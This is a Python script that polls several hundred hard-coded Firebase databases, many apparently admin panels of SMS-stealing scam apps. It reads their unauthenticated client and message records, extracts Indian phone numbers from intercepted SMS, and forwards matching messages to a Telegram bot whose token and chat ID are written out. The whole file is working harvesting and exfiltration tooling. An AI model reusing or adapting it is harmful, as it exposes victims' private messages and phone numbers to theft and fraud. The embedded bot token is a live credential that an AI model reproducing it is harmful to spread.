#!/usr/init/env python3
"""
Async Ultra-Fast Firebase Monitor & Telegram Forwarder (Error Handled)
"""

import asyncio
import aiohttp
import json
import re
from datetime import datetime, date
from urllib.parse import urlparse, parse_qs
import base64

BOT_TOKEN = "8873656141:AAHzLZjt1rEz2N_pP8Mi7Bdf1scMUOeAnGM"
TARGET_CHAT_ID = 948418348  

EMBEDDED_PANELS = [
    "https://project-f2fd6-default-rtdb.firebaseio.com",
    "https://rajakk-80ecd-default-rtdb.firebaseio.com",
    "https://sastaapp-394cd-default-rtdb.firebaseio.com",
    "https://zinga-1ae57-default-rtdb.firebaseio.com",
    "https://mrrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://blrm-c65dd-default-rtdb.firebaseio.com",
    "https://bszshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://rojam-ff090-default-rtdb.firebaseio.com",
    "https://jdjfjiiii-default-rtdb.firebaseio.com",
    "https://gagan-86381-default-rtdb.firebaseio.com",
    "https://crow-59d20-default-rtdb.firebaseio.com",
    "https://emesh-94556-default-rtdb.firebaseio.com",
    "https://juliy-b71b7-default-rtdb.firebaseio.com",
    "https://devilop-c0b6d-default-rtdb.firebaseio.com",
    "https://VIP.firebaseio.com",
    "https://abhinav-panel-default-rtdb.firebaseio.com",
    "https://abhirt-58f65-default-rtdb.firebaseio.com",
    "https://ai-rto-9-default-rtdb.firebaseio.com",
    "https://ajay-new-6d0cf-default-rtdb.firebaseio.com",
    "https://ajna-20fc4-default-rtdb.firebaseio.com",
    "https://anuxtg-panel-default-rtdb.firebaseio.com",
    "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "https://axis-c4bd3-default-rtdb.firebaseio.com",
    "https://barik-a53e5-default-rtdb.firebaseio.com",
    "https://berlin-al-default-rtdb.firebaseio.com",
    "https://bhai-ff991-default-rtdb.firebaseio.com",
    "https://bu-3-13-default-rtdb.firebaseio.com",
    "https://can-4-668a0-default-rtdb.firebaseio.com",
    "https://chur1h3j4h-default-rtdb.firebaseio.com",
    "https://court-45a35-default-rtdb.firebaseio.com",
    "https://customer-support-2152-3-1-25-default-rtdb.firebaseio.com",
    "https://cwpiah-default-rtdb.firebaseio.com",
    "https://devikaadmin-plane-default-rtdb.firebaseio.com",
    "https://devil-test-project-default-rtdb.firebaseio.com",
    "https://dost-42d3f-default-rtdb.firebaseio.com",
    "https://fatmaadminpanel-default-rtdb.firebaseio.com",
    "https://flick-f1879-default-rtdb.firebaseio.com",
    "https://fpro3indus-default-rtdb.firebaseio.com",
    "https://gggggg-979bd-default-rtdb.firebaseio.com",
    "https://green-9bf52-default-rtdb.firebaseio.com",
    "https://hdfc-561e8-default-rtdb.firebaseio.com",
    "https://investing-eaf64-default-rtdb.firebaseio.com",
    "https://jamini-c946b-default-rtdb.firebaseio.com",
    "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "https://jayma-9ce22-default-rtdb.firebaseio.com",
    "https://ji09-bbeec-default-rtdb.firebaseio.com",
    "https://kali-90e1e-default-rtdb.firebaseio.com",
    "https://kingbggbb-default-rtdb.firebaseio.com",
    "https://kumar-8f205-default-rtdb.firebaseio.com",
    "https://maxa29-f652e-default-rtdb.firebaseio.com",
    "https://mparirajkumar-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mpariwhan-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://naga3-1eba1-default-rtdb.firebaseio.com",
    "https://newtan3450-default-rtdb.firebaseio.com",
    "https://novap7-725ff-default-rtdb.firebaseio.com",
    "https://nownui-8769a-default-rtdb.firebaseio.com",
    "https://offline-f65fe-default-rtdb.firebaseio.com",
    "https://og-agent-169d4-default-rtdb.firebaseio.com",
    "https://panel-raj-default-rtdb.firebaseio.com",
    "https://panel123628-default-rtdb.firebaseio.com",
    "https://penal-devil-default-rtdb.firebaseio.com",
    "https://pjsos-f2cc8-default-rtdb.firebaseio.com",
    "https://pm-kisan-111-default-rtdb.firebaseio.com",
    "https://ppaanaal-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://priyavvv-default-rtdb.firebaseio.com",
    "https://project-1-16da0-default-rtdb.firebaseio.com",
    "https://r123ty-c2b48-default-rtdb.firebaseio.com",
    "https://rahul-admin-b6ebe-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "https://rajarto-54a9d-default-rtdb.firebaseio.com",
    "https://rajkumar-5af9d-default-rtdb.firebaseio.com",
    "https://rajputlodu-5bed0-default-rtdb.firebaseio.com",
    "https://rancho-72506-default-rtdb.firebaseio.com",
    "https://rantaishita-f7614-default-rtdb.firebaseio.com",
    "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "https://robi-4a17f-default-rtdb.firebaseio.com",
    "https://rocky-24064-default-rtdb.firebaseio.com",
    "https://rto-50z-apr-28-default-rtdb.firebaseio.com",
    "https://rto-d9-03-05-2026-default-rtdb.firebaseio.com",
    "https://rto91-2b27f-default-rtdb.firebaseio.com",
    "https://rupa-36767-default-rtdb.firebaseio.com",
    "https://samina-623e8-default-rtdb.firebaseio.com",
    "https://sawoobhmg-default-rtdb.firebaseio.com",
    "https://sb21-6b406-default-rtdb.firebaseio.com",
    "https://sbi-yono-i31an-default-rtdb.firebaseio.com",
    "https://shuruwat-admin-default-rtdb.firebaseio.com",
    "https://strange-2e4aa-default-rtdb.firebaseio.com",
    "https://suman-95a0a-default-rtdb.firebaseio.com",
    "https://testing-81627-default-rtdb.firebaseio.com",
    "https://tryagainnew-58f1a-default-rtdb.firebaseio.com",
    "https://uco-pagekage-change-default-rtdb.firebaseio.com",
    "https://udkudjudj-default-rtdb.firebaseio.com",
    "https://vibe-d238e-default-rtdb.firebaseio.com",
    "https://yt01-75a36-default-rtdb.firebaseio.com",
    "https://z-amit-apr-29-default-rtdb.firebaseio.com",
    "https://room-29b11-default-rtdb.firebaseio.com",
    "https://vickyadmin45-default-rtdb.firebaseio.com",
    "https://boby-panel-yellow-ashe-default-rtdb.firebaseio.com",
    "https://vish-4a6de-default-rtdb.firebaseio.com",
    "https://vampirebhsuhan-default-rtdb.firebaseio.com",
    "https://ak-47-93ca8-default-rtdb.firebaseio.com",
    "https://khanipanel-d58cf-default-rtdb.firebaseio.com",
    "https://desert-fc320-default-rtdb.firebaseio.com",
    "https://xxxxz-2e129-default-rtdb.firebaseio.com",
    "https://maxy1213-31346-default-rtdb.firebaseio.com",
    "https://freefire-c51f2-default-rtdb.firebaseio.com",
    "https://xiaoms-6c15b-default-rtdb.firebaseio.com",
    "https://raj-panel-3e09a-default-rtdb.firebaseio.com",
    "https://rajcom-92cc6-default-rtdb.firebaseio.com",
    "https://e5turnament5-default-rtdb.firebaseio.com",
    "https://deepakdblprn-default-rtdb.firebaseio.com",
    "https://e31turnament1-default-rtdb.firebaseio.com",
    "https://ramesh-67a2b-default-rtdb.firebaseio.com",
    "https://mi-admin-7c5f0-default-rtdb.firebaseio.com",
    "https://crazy-91b9d-default-rtdb.firebaseio.com",
    "https://king-simgh-default-rtdb.firebaseio.com",
    "https://subhuapril-8932a-default-rtdb.firebaseio.com",
    "https://pornllllll-default-rtdb.firebaseio.com",
    "https://absbsb-73abb-default-rtdb.firebaseio.com",
    "https://pikachu-panel-default-rtdb.firebaseio.com",
    "https://sachin-5d8c3-default-rtdb.firebaseio.com",
    "https://raju-7f9f8-default-rtdb.firebaseio.com",
    "https://amit-2afcb-default-rtdb.firebaseio.com",
    "https://apun-e55af-default-rtdb.firebaseio.com",
    "https://project3-21573-default-rtdb.firebaseio.com",
    "https://rana-hu-default-rtdb.firebaseio.com",
    "https://rockey-8b546-default-rtdb.firebaseio.com",
    "https://shuyant-caab5-default-rtdb.firebaseio.com",
    "https://ankit-raj-chutiya-default-rtdb.firebaseio.com",
    "https://scamwala-banda-default-rtdb.firebaseio.com",
    "https://ramu-c81a7-default-rtdb.firebaseio.com",
    "https://pri14-b45dd-default-rtdb.firebaseio.com",
    "https://radhe-penal-default-rtdb.firebaseio.com",
    "https://punj-admin-panel-default-rtdb.firebaseio.com",
    "https://anmol-62196-default-rtdb.firebaseio.com",
    "https://xxxx-e322a-default-rtdb.firebaseio.com",
    "https://harami-fe6e1-default-rtdb.firebaseio.com",
    "https://annu-5e84c-default-rtdb.firebaseio.com",
    "https://ssssss-52f85-default-rtdb.firebaseio.com",
    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
    "https://ramjidost-default-rtdb.firebaseio.com",
    "https://mopsgsh-default-rtdb.firebaseio.com",
    "https://kingu8-73ebe-default-rtdb.firebaseio.com",
    "https://saket-2-default-rtdb.firebaseio.com",
    "https://pm280reolc-default-rtdb.firebaseio.com",
    "https://arifyellow-efd98-default-rtdb.firebaseio.com",
    "https://rtomumbai-bc919-default-rtdb.firebaseio.com",
    "https://risho-d4c66-default-rtdb.firebaseio.com",
    "https://simadevi-f42fc-default-rtdb.firebaseio.com",
    "https://jpicku-47790-default-rtdb.firebaseio.com",
    "https://singhaana-6f199-default-rtdb.firebaseio.com",
    "https://admin-panel-pikachu-default-rtdb.firebaseio.com",
    "https://allienware-c11b0-default-rtdb.firebaseio.com",
    "https://totla-panel-default-rtdb.firebaseio.com",
    "https://ritesh0001-ea582-default-rtdb.firebaseio.com",
    "https://mafiaaaa2oppp-default-rtdb.firebaseio.com",
    "https://sep12-aea6d-default-rtdb.firebaseio.com",
    "https://apkdriod-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
    "https://bank-e-kyc-default-rtdb.firebaseio.com",
    "https://e9tournament1-default-rtdb.firebaseio.com",
    "https://raaz-5287d-default-rtdb.firebaseio.com",
    "https://e14turnament2-default-rtdb.firebaseio.com",
    "https://bossuun-default-rtdb.firebaseio.com",
    "https://jsjsjdq-7f0d1-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "https://gsjjshdbs-default-rtdb.firebaseio.com",
    "https://apkdriod-f6ff9-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com",
    "https://newspreding-default-rtdb.firebaseio.com",
    "https://privatesok-59944-default-rtdb.firebaseio.com",
    "https://e5tournament2-default-rtdb.firebaseio.com",
    "https://fir-27c9e-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com",
    "https://ravi-23776-default-rtdb.firebaseio.com",
    "https://painislv-default-rtdb.firebaseio.com",
    "https://metabank-3def8-default-rtdb.firebaseio.com",
    "https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://annu-f0207-default-rtdb.firebaseio.com",
    "https://hdjjdjq-a73f2-default-rtdb.firebaseio.com",
    "https://tinmm88-b7db5-default-rtdb.firebaseio.com",
    "https://rto3-53dc7-default-rtdb.firebaseio.com",
    "https://kali-1b217-default-rtdb.firebaseio.com",
    "https://roy8-c8fe7-default-rtdb.firebaseio.com",
    "https://testuuu-f5cbb-default-rtdb.firebaseio.com",
    "https://rajabhaya-default-rtdb.firebaseio.com",
    "https://mr-alone1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://paisa-8e4f4-default-rtdb.firebaseio.com",
    "https://lalit-847ca-default-rtdb.firebaseio.com",
    "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "https://jayho-5e76a-default-rtdb.firebaseio.com",
    "https://mukesh-7c9a5-default-rtdb.firebaseio.com",
    "https://arvind-c5b03-default-rtdb.firebaseio.com",
    "https://kingu-2dbb9-default-rtdb.firebaseio.com",
    "https://sonu-5e324-default-rtdb.firebaseio.com",
    "https://paro-df7ed-default-rtdb.firebaseio.com",
    "https://colana-84ce2-default-rtdb.firebaseio.com",
    "https://dath-da88a-default-rtdb.firebaseio.com",
    "https://joginder-jhatkila-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://customer-support-2-89e52-default-rtdb.firebaseio.com",
    "https://suman-95a0a-default-rtdb.firebaseio.com",
    "https://anamikaadminpanel-default-rtdb.firebaseio.com",
    "https://yono-ad3-default-rtdb.firebaseio.com",
    "https://asifpersnolyellow-default-rtdb.firebaseio.com",
    "https://burchanno-default-rtdb.firebaseio.com",
    "https://gigapaid-39e9c-default-rtdb.firebaseio.com",
    "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "https://bajshehs-b8e74-default-rtdb.firebaseio.com",
    "https://hfahuususis-default-rtdb.firebaseio.com",
    "https://hdhdhdh-38ae0-default-rtdb.firebaseio.com",
    "https://ppoi02-default-rtdb.firebaseio.com",
    "https://rto-e-challan--o23t-default-rtdb.firebaseio.com",
    "https://rajapp-ca991-default-rtdb.firebaseio.com",
    "https://lli02-dbc69-default-rtdb.firebaseio.com",
    "https://pk114-6e828-default-rtdb.firebaseio.com",
    "https://suwer-64cd1-default-rtdb.firebaseio.com",
    "https://carderpanel-default-rtdb.firebaseio.com",
    "https://anudg-21c1c-default-rtdb.firebaseio.com",
    "https://update-cf7a9-default-rtdb.firebaseio.com",
    "https://i-am-devil-9297c-default-rtdb.firebaseio.com",
    "https://kira-e0cce-default-rtdb.firebaseio.com",
    "https://tanvi-ji77-default-rtdb.firebaseio.com",
    "https://nitu-23980-default-rtdb.firebaseio.com",
    "https://astha-rani80-default-rtdb.firebaseio.com",
    "https://rahul-g11-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://krisna574-ffef3-default-rtdb.firebaseio.com",
    "https://navin-9fb56-default-rtdb.firebaseio.com",
    "https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://palms-568c7-default-rtdb.firebaseio.com",
    "https://ranu-e604c-default-rtdb.firebaseio.com",
    "https://jjhgj-b86e1-default-rtdb.firebaseio.com",
    "https://kammarene-default-rtdb.firebaseio.com",
    "https://bantt-d1048-default-rtdb.firebaseio.com",
    "https://lallo-6d4c5-default-rtdb.firebaseio.com",
    "https://alwayssukuna-4dbb7-default-rtdb.firebaseio.com",
    "https://vclub-fd078-default-rtdb.firebaseio.com",
    "https://kishorkumar-ec558-default-rtdb.firebaseio.com",
    "https://vijay-afb12-default-rtdb.firebaseio.com",
    "https://rewq-316b1-default-rtdb.firebaseio.com",
    "https://muto-b3b9d-default-rtdb.firebaseio.com",
    "https://mamu-4db6e-default-rtdb.firebaseio.com",
    "https://yeloselrj-default-rtdb.firebaseio.com",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://ambika-ji61-default-rtdb.firebaseio.com",
    "https://stepan1244-52e34-default-rtdb.firebaseio.com",
    "https://jiordojvj-default-rtdb.firebaseio.com",
    "https://vrajbhai-4aa6e-default-rtdb.firebaseio.com",
    "https://opposite-def43-default-rtdb.firebaseio.com",
    "https://gojohere-29ab1-default-rtdb.firebaseio.com",
    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
    "https://ambani-19a25-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://iflexcode-b6a11-default-rtdb.firebaseio.com",
    "https://kanak-ji99-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://ranjit-58640-default-rtdb.firebaseio.com",
    "https://vasu-new-panel-default-rtdb.firebaseio.com",
    "https://ahmedpanel-76b9c-default-rtdb.firebaseio.com",
    "https://ankitpanel-59086-default-rtdb.firebaseio.com",
    "https://vggogo-79fcb-default-rtdb.firebaseio.com",
    "https://medical2-579d3-default-rtdb.firebaseio.com",
    "https://rurukatiu-default-rtdb.firebaseio.com",
    "https://ajio-427d1-default-rtdb.firebaseio.com",
    "https://bittu3pannel-default-rtdb.firebaseio.com",
    "https://priiieieie-default-rtdb.firebaseio.com",
    "https://world-6b099-default-rtdb.firebaseio.com",
    "https://atifhehu-7ec17-default-rtdb.firebaseio.com",
    "https://fgccvhhhbv-default-rtdb.firebaseio.com",
    "https://ranimukarji-1182a-default-rtdb.firebaseio.com",
    "https://ssgg-5416f-default-rtdb.firebaseio.com",
    "https://usa-n-landon-default-rtdb.firebaseio.com",
    "https://check-skyler-default-rtdb.firebaseio.com",
    "https://jj-gambler-default-rtdb.firebaseio.com",
    "https://sintuadmin-default-rtdb.firebaseio.com",
    "https://arun2580-858e8-default-rtdb.firebaseio.com",
    "https://xiss-9b282-default-rtdb.firebaseio.com",
    "https://maxo12-default-rtdb.firebaseio.com",
    "https://rajaji-8d135-default-rtdb.firebaseio.com",
    "https://whythisfucke-default-rtdb.firebaseio.com",
    "https://pikachu-customer-16-default-rtdb.firebaseio.com",
    "https://akdh-e4bf4-default-rtdb.firebaseio.com",
    "https://adpanel37-default-rtdb.firebaseio.com",
    "https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
    "https://gdgdgdgd-c1a32-default-rtdb.firebaseio.com",
    "https://atifheree-default-rtdb.firebaseio.com",
    "https://yourfirebase-default-rtdb.firebaseio.com",
    "https://gfaatelisell-default-rtdb.firebaseio.com",
    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://baba-tillu-2-default-rtdb.firebaseio.com",
    "https://mmmmnnnnnn-4ba6f-default-rtdb.firebaseio.com",
    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
    "https://alwaysaatif7-default-rtdb.firebaseio.com",
    "https://tinmur-777e8-default-rtdb.firebaseio.com",
    "https://keepsnss-default-rtdb.firebaseio.com",
    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
    "https://sexyvideocall-b55b4-default-rtdb.firebaseio.com",
    "https://roll-52f94-default-rtdb.firebaseio.com",
    "https://acchahi-default-rtdb.firebaseio.com",
    "https://samku-5738a-default-rtdb.firebaseio.com",
    "https://hexabhai-default-rtdb.firebaseio.com",
    "https://workohplic-default-rtdb.firebaseio.com",
    "https://mook-1ddfc-default-rtdb.firebaseio.com",
    "https://brodj-162c6-default-rtdb.firebaseio.com",
    "https://mera-19f84-default-rtdb.firebaseio.com",
    "https://union-b656e-default-rtdb.firebaseio.com",
    "https://flashowmv1-enginepower-default-rtdb.firebaseio.com",
    "https://heisenberg-8c3da-default-rtdb.firebaseio.com",
    "https://aujla-afe1a-default-rtdb.firebaseio.com",
    "https://bullpass-f2c8c-default-rtdb.firebaseio.com",
    "https://cjarkuadmin-default-rtdb.firebaseio.com",
    "https://my-penel-maxjoker98-default-rtdb.firebaseio.com",
    "https://admin-39ss-default-rtdb.firebaseio.com",
    "https://premmiiii-default-rtdb.firebaseio.com",
    "https://rambhai-45c3a-default-rtdb.firebaseio.com",
    "https://sanjana-admin-panel-default-rtdb.firebaseio.com",
    "https://shankar-tipul-default-rtdb.firebaseio.com",
    "https://yellow-new-panel-srt-rto-zziam-default-rtdb.firebaseio.com",
    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
    "https://deepk-hh-default-rtdb.firebaseio.com",
    "https://kalih-f389d-default-rtdb.firebaseio.com",
    "https://chutiya-136fc-default-rtdb.firebaseio.com",
    "https://chhgg-dc213-default-rtdb.firebaseio.com",
    "https://seuihd-default-rtdb.firebaseio.com",
    "https://hdrbf-485ec-default-rtdb.firebaseio.com",
    "https://ravan-98ef1-default-rtdb.firebaseio.com",
    "https://rohet10-8919f-default-rtdb.firebaseio.com",
    "https://rajababukwirat-default-rtdb.firebaseio.com",
    "https://admin-cliwny-default-rtdb.firebaseio.com",
    "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "https://admin-panel-khanashif-default-rtdb.firebaseio.com",
    "https://fir-new-fe8b8-default-rtdb.firebaseio.com",
    "https://comkingdir-default-rtdb.firebaseio.com",
    "https://priysnhuu-default-rtdb.firebaseio.com",
    "https://suman-penal-default-rtdb.firebaseio.com",
    "https://download-b7393-default-rtdb.firebaseio.com",
    "https://jeko-c11ef-default-rtdb.firebaseio.com",
    "https://jannu-c03ea-default-rtdb.firebaseio.com",
    "https://rich-people-19e06-default-rtdb.firebaseio.com",
    "https://lucifer-spreader-default-rtdb.firebaseio.com",
    "https://hood-4ba1e-default-rtdb.firebaseio.com",
    "https://master-admin-6c650-default-rtdb.firebaseio.com",
    "https://pint-f465b-default-rtdb.firebaseio.com",
    "https://jkhsadfhjk-default-rtdb.firebaseio.com",
    "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "https://totla-axis-default-rtdb.firebaseio.com",
    "https://iiiii-ade0e-default-rtdb.firebaseio.com",
    "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
    "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
    "https://rolex-carder-default-rtdb.firebaseio.com",
    "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
    "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
    "https://demonrat-aa782-default-rtdb.firebaseio.com",
    "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
    "https://bunty-51bcc-default-rtdb.firebaseio.com",
    "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
    "https://riyy-e012e-default-rtdb.firebaseio.com",
    "https://zeni-ae60b-default-rtdb.firebaseio.com",
    "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
    "https://no-admin-e0a30-default-rtdb.firebaseio.com",
    "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "https://haab-b3370-default-rtdb.firebaseio.com",
    "https://rettiugh-default-rtdb.firebaseio.com",
    "https://danish-77fe3-default-rtdb.firebaseio.com",
    "https://rto-02-april06-default-rtdb.firebaseio.com",
    "https://sexypayload-default-rtdb.firebaseio.com",
    "https://deepak-c22e3-default-rtdb.firebaseio.com",
    "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "https://free-hospital-default-rtdb.firebaseio.com",
    "https://xoid-arif-default-rtdb.firebaseio.com",
    "https://chut-569a0-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://shoot-admin-68edc-default-rtdb.firebaseio.com",
    "https://hello-aae5a-default-rtdb.firebaseio.com"
]

TARGET_URL = "https://www.worldpharmacistdaybyopellarewards.com/"
TARGET_DATE = date(2026, 9, 26)

def parse_firebase_link(link: str):
    link = link.strip()
    if link.startswith(("http://", "https://")) and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        return link.rstrip("/") + "/"
    return None

def is_online_device(data: dict) -> bool:
    if not isinstance(data, dict):
        return False
    for key in ("status", "state", "online", "isOnline", "connected", "isConnected"):
        val = data.get(key)
        if val is True or val == 1 or (isinstance(val, str) and val.lower() in {"true", "online", "connected", "active"}):
            return True
    return False

def extract_phone(device_msgs: dict):
    patterns = [re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")]
    counts = {}
    for msg in device_msgs.values():
        if not isinstance(msg, dict): continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
        for pat in patterns:
            for num in pat.findall(text):
                counts[num] = counts.get(num, 0) + 1
    return max(counts, key=counts.get) if counts else None

async def fetch_panel(session, panel_url, seen_ids):
    try:
        async with session.get(f"{panel_url}clients.json", timeout=5) as resp:
            if resp.status != 200: return []
            clients = await resp.json() or {}
        
        async with session.get(f"{panel_url}messages.json", timeout=5) as resp:
            if resp.status != 200: return []
            messages = await resp.json() or {}

        if not isinstance(clients, dict): return []

        results = []
        for cid, cdata in clients.items():
            if not is_online_device(cdata): continue
            device_msgs = messages.get(str(cid), {}) if isinstance(messages, dict) else {}
            phone = extract_phone(device_msgs)
            if not phone: continue

            for mid, mdata in device_msgs.items():
                if not isinstance(mdata, dict) or mid in seen_ids: continue
                body = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")
                
                if TARGET_URL not in body: continue

                try:
                    ts = int(mid) / 1000
                except:
                    ts = 0

                if ts > 0:
                    msg_date = datetime.fromtimestamp(ts).date()
                    if msg_date != TARGET_DATE: continue
                else:
                    continue

                sender = mdata.get("sender") or mdata.get("from") or "Unknown"
                results.append({
                    "panel_url": panel_url,
                    "device_id": str(cid),
                    "phone": phone,
                    "msg_id": mid,
                    "sender": sender,
                    "body": body,
                    "timestamp": ts
                })
        return results
    except Exception as e:
        # Print error to logs if any panel fails
        # print(f"Panel error {panel_url}: {e}")
        return []

async def send_telegram(session, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        async with session.post(url, json={"chat_id": TARGET_CHAT_ID, "text": text}, timeout=10) as resp:
            return resp.status == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

async def main():
    try:
        valid_urls = [parse_firebase_link(u) for u in EMBEDDED_PANELS if parse_firebase_link(u)]
        print(f"🚀 Async Monitor started with {len(valid_urls)} panels.")
        
        seen_ids = set()
        connector = aiohttp.TCPConnector(limit=50, ssl=False) # Safe limit for free tiers
        async with aiohttp.ClientSession(connector=connector, headers={"User-Agent": "Mozilla/5.0"}) as session:
            await send_telegram(session, "✅ Async World Pharmacist Day Monitor STARTED (26/09/2026).")
            
            while True:
                tasks = [fetch_panel(session, url, seen_ids) for url in valid_urls]
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                for res_list in responses:
                    if isinstance(res_list, list):
                        for msg in res_list:
                            if msg["msg_id"] in seen_ids: continue
                            seen_ids.add(msg["msg_id"])
                            
                            dt = datetime.fromtimestamp(msg["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
                            print(f"[{dt}] [{msg['device_id']}] {msg['phone']}: {msg['body']}")
                            
                            text = (
                                f"🎯 World Pharmacist Day Hit (26/09/2026)!\n\n"
                                f"🔗 DB Link: {msg['panel_url']}\n"
                                f"💻 Device ID: {msg['device_id']}\n"
                                f"📱 Phone: +91{msg['phone']}\n"
                                f"👤 Sender: {msg['sender']}\n"
                                f"🕒 Time: {dt}\n\n"
                                f"💬 Message:\n{msg['body']}"
                            )
                            await send_telegram(session, text)
                
                await asyncio.sleep(1)
    except Exception as e:
        print(f"CRITICAL MAIN ERROR: {e}")
        raise e

if __name__ == "__main__":
    asyncio.run(main())